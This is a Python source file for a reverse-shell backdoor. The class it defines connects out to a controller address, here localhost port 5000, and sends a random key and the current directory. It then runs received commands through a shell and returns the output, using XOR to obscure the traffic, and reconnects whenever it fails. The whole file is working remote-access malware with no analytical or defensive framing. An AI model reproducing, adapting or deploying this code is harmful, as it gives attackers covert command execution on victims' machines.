from socket import socket, AF_INET, SOCK_STREAM
from subprocess import Popen, PIPE, DEVNULL
import time
import os
import random
import string


class Backdoor:
    def __init__(self, ip, port):
        self.IP = ip
        self.PORT = port
        self.key = ''

    def connect(self):
        try:
            self.connection = socket(AF_INET, SOCK_STREAM)
            self.connection.connect((self.IP, self.PORT))
            self.key = "".join(random.choice(
                string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(0, 1024))
            cwd = os.getcwd().replace('\\', '/')
            self.connection.send(self.key.encode())
            self.x_send(cwd)
        except Exception:
            self.connection.close()
            time.sleep(2)
            self.connect()

    def chdir(self, dir):
        try:
            os.chdir(dir)
            cwd = os.getcwd().replace('\\', '/')
        except:
            cwd = os.getcwd().replace('\\', '/')
        return cwd

    def str_xor(self, s1, s2):
        enc = "".join([chr(ord(c1) ^ ord(c2)) for (c1, c2) in zip(s1, s2)])
        return enc

    def x_send(self, msg):
        encrypted = ""
        if (len(msg) > 1024):
            for i in range(0, len(msg), 1024):
                chunk = msg[0+i:1024+i]
                encrypted += self.str_xor(chunk, self.key)
            encrypted = encrypted.encode()
        else:
            encrypted = self.str_xor(msg, self.key).encode()
        encrypted += "done".encode()
        self.connection.send(encrypted)

    def x_recv(self):
        data = "".encode()
        while not data.endswith("done".encode()):
            data += self.connection.recv(1024)
        data = data[:-4]
        data = data.decode()
        decrypted = ""
        if len(data) > 1024:
            for i in range(0, len(data), 1024):
                chunk = data[i+0:i+1024]
                decrypted += self.str_xor(chunk, self.key)
        else:
            decrypted = self.str_xor(data, self.key)
        return decrypted

    def exec_cmd(self, cmd):
        res = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE, stdin=DEVNULL)
        stdout = res.stdout.read().decode(errors='ignore').strip()
        stderr = res.stderr.read().decode(errors='ignore').strip()
        if stdout:
            return (stdout)
        elif stderr:
            return (stderr)
        else:
            return ''

    def run(self):
        self.connect()
        while True:
            try:
                cmd = self.x_recv().split()
                if cmd[0] == 'cd' and len(cmd) > 1:
                    cwd = self.chdir(cmd[1])
                    self.x_send(cwd)
                elif cmd[0] == 'terminate':
                    self.connection.close()
                    self.connect()
                else:
                    out = self.exec_cmd(cmd)
                    self.x_send(out)
            except:
                self.connect()

backdoor = Backdoor("localhost", 5000)
backdoor.run()
